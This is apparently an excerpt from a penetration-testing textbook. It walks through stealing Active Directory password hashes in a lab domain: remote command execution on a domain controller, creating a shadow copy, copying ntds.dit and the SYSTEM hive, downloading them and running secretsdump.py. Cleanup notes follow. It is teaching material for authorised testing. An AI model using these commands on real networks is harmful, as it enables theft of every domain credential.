### Figure 10.2: Accessing Protected Domain Controller Files Using a Volume Shadow Copy

#### 186
**CHAPTER 10: Controlling the Entire Network**

To access the domain controller with domain admin credentials and check for existing Volume Shadow Copies (VSCs), I will use the `cme` command:

```bash
cme smb 10.0.10.200 -u serveradmin -p 'S3cr3tPa$$!' -x 'vssadmin list shadows'
```

The output from this command indicates that there are no existing VSCs on the domain controller:

```plaintext
[*] Windows 10.0 Build 17763 (name:GOKU) (domain:CAPSULECORP)
[+] CAPSULECORP\serveradmin:S3cr3tPa$$! (Pwn3d!)
[+] Executed command 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
No items found that satisfy the query.
```

Since there are no existing VSCs, you will need to create one to obtain a copy of `ntds.dit`. You can create a new VSC using the following `vssadmin` command:

```bash
vssadmin create shadow /for=C:
```

The output will show the successful creation of a new VSC, along with its unique identifier and volume name:

```plaintext
[*] Windows 10.0 Build 17763 (name:GOKU) (domain:CAPSULECORP)
[+] CAPSULECORP\serveradmin:S3cr3tPa$$! (Pwn3d!)
[+] Executed command 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
Successfully created shadow copy for 'C:\'
Shadow Copy ID: {0fb03856-d017-4768-b00c-5e7b37a6cfd5}
Volume Name:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

To access the `ntds.dit` file within the newly created VSC, use the following path:

```plaintext
\\?\globalroot\device\harddiskvolumeshadowcopy1\windows\ntds\ntds.dit
```

This path is similar to the standard C: drive path, but it points to the VSC. You now have unrestricted access to the entire C: drive via the VSC.

#### 187
**ntds.dit and the Keys to the Kingdom**

To simplify access, copy the `ntds.dit` file to the root of the C: drive:

```bash
copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\ntds\ntds.dit c:\ntds.dit
```

Additionally, you need to copy the `SYSTEM` registry hive from the VSC to the C: drive:

```bash
copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config\SYSTEM c:\sys
```

Next, download these files from the domain controller to your attacking machine using `smbclient.py`, part of the Impacket Python framework. Connect to the domain controller with the following command:

```bash
smbclient.py 'CAPSULECORP/serveradmin:S3cr3tPa$$!'@10.0.10.200
```

Once connected, use the `C$` share to access the local filesystem and download the `ntds.dit` and `sys` files:

```plaintext
# use C$
# ls
-rw-rw-rw-   37748736  Thu Apr  9 10:19:41 2020 ntds.dit
-rw-rw-rw-   16515072  Thu Jan 31 14:54:41 2019 sys
# get ntds.dit
# get sys
# exit
```

#### 188
**Extracting All the Hashes with secretsdump.py**

Use `secretsdump.py` from the Impacket framework to extract the user account and password hashes from the `ntds.dit` file:

```bash
secretsdump.py -system sys -ntds ntds.dit -just-dc-ntlm LOCAL
```

The output will include all the password hashes for the domain, as shown in Listing 10.11.

#### 189
**Summary**

- The `net` command can be used to query Active Directory groups and identify domain admin users.
- The `qwinsta` command can display currently logged-in users.
- The `psexec_command` Metasploit module can run `qwinsta` on multiple hosts to locate systems with domain admin users logged in.
- Tools like Incognito and Mimikatz can harvest credentials and authentication tokens.
- The `ntds.dit` file contains the password hashes for all Active Directory user accounts.
- You can access `ntds.dit` and the system registry hive from a VSC.
- `secretsdump.py` can extract the password hashes from `ntds.dit`.

**Exercise 10.1: Stealing Passwords from ntds.dit**
- Access the domain controller `goku.capsulecorp.local` using the credentials obtained from `raditz.capsulecorp.local`.
- Create a VSC using `vssadmin` and copy `ntds.dit` and the `SYSTEM` registry hive.
- Download the files to your attacking machine and use `secretsdump.py` to extract the password hashes.

#### 190
**Phase 4: Documentation**

After completing the technical testing, you must document your findings, observations, and recommendations in a concise and actionable report for your client or engagement stakeholders. This section focuses on two main objectives: cleanup and report writing.

#### 193
**Post-Engagement Cleanup**

Before moving on to writing the deliverable, it's important to cover post-engagement cleanup. This includes removing unnecessary artifacts such as leftover files, backdoors, and configuration changes.

#### 194
**CHAPTER 11: Post-Engagement Cleanup**

**Killing Active Shell Connections**
- Use `sessions -K` in `msfconsole` to kill all active Meterpreter sessions.
- Verify with `sessions -l` to ensure no active sessions remain.

**Deactivating Local User Accounts**
- Remove any local user accounts created during the pentest.
- In the Capsulecorp pentest, you did not create new accounts, but you did overwrite the `/etc/passwd` file on a Linux server, which needs to be addressed.

This checklist ensures that the environment is returned to its original state, maintaining professionalism and leaving the client with a positive experience.